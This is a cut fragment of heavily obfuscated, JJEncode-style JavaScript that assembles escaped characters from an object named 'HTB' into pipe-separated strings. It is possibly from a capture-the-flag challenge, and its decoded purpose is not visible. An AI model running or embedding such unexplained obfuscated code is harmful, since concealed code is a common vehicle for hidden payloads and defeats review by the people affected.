"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$$$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.__$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$__$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB.$$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$__$+HTB.$_$+HTB.$_$$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_$+HTB.$__$+"|\\"+HTB.__$+HTB.$_$+HTB.___+HTB.__+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|"+HTB.$$_$+HTB.$$$_+HTB.__$+HTB.$$$$+HTB.$_$$+HTB.$_$+HTB.$$_+HTB.__$+HTB._$$+HTB._$$+HTB.$___+HTB.$$$$+HTB.$$$_+HTB.___+HTB.$$$$+HTB.$_$_+HTB.$$$+HTB.$$_$+HTB.__$+HTB.$_$$+HTB.$$$+HTB.$$$_+HTB.__$+HTB._$$+HTB.$$$$+HTB.$$$$+HTB.$__+HTB._$_+HTB.__$+HTB.$__$+HTB.$$$$+HTB.$$_+"|"+HTB.$_$_+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$$_+"|"+HTB.$$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"|\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.__$+HTB.$$__+HTB.$_$$+HTB.$_$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$$$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$$$$+"\\"+HTB.__$+HTB.___+HTB.$$$+"|"+HTB.$_$_+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$_$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$___+HTB._$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$_$$+"\\"+HTB.__$+HTB.__$+HTB._$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$__$+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$$+"|\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$___+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+HTB.$_$$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB.$$$+HTB.__$+HTB.$___+HTB._$+HTB.__+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.__$+HTB.$___+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+(![]+"")[HTB._$_]+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$__+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+HTB.$$$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.$$$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$_+HTB.$$$+HTB.$___+"|\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.___+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB.$$_+HTB._$+HTB.$$$_+HTB.$$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$__+HTB.$_$_+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$__+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.__$+HTB._$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$_$+HTB.$_$_+HTB.__+HTB.$_$_+"|\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+HTB._$+HTB._+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB._$_+HTB.$_$$+HTB.$$__+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+HTB.__+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB._+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$_$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$__+(![]+"")[HTB._$_]+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB._+HTB.$__+"\\"+HTB.__$+HTB.___+HTB._$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+(![]+"")[HTB._$_]+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+HTB.$___+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+HTB._+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$_$_+"\\"+HTB.__$+HTB.__$+HTB._$$+HTB.$__+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB._$$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$$$_+HTB.$__+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.__+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB._+HTB.$_$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.__+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|"+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB.$_$_+"|\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$___+"|"+HTB.$_$_+HTB.$___+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|\\"+HTB.__$+HTB.$_$+HTB._$_+HTB.$___+HTB._$+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$_+HTB.$_$_+"|\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$_$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$___+"|"+HTB.$_$$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$___+"|"+HTB._$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$_$+HTB._$_+HTB.$_$+HTB.$$_$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB._$_+HTB.$__+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$$+HTB.__$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB._$_+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"|\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB._+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"|"+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+HTB.$_$_+HTB.$_$+"|\\"+HTB.__$+HTB.___+HTB.$$_+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+"|\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$_$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"|"+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__$+"|"+HTB.$$__+HTB.$_$_+HTB.__+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$$+HTB.$$_+HTB.$_$$+HTB.$$$$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__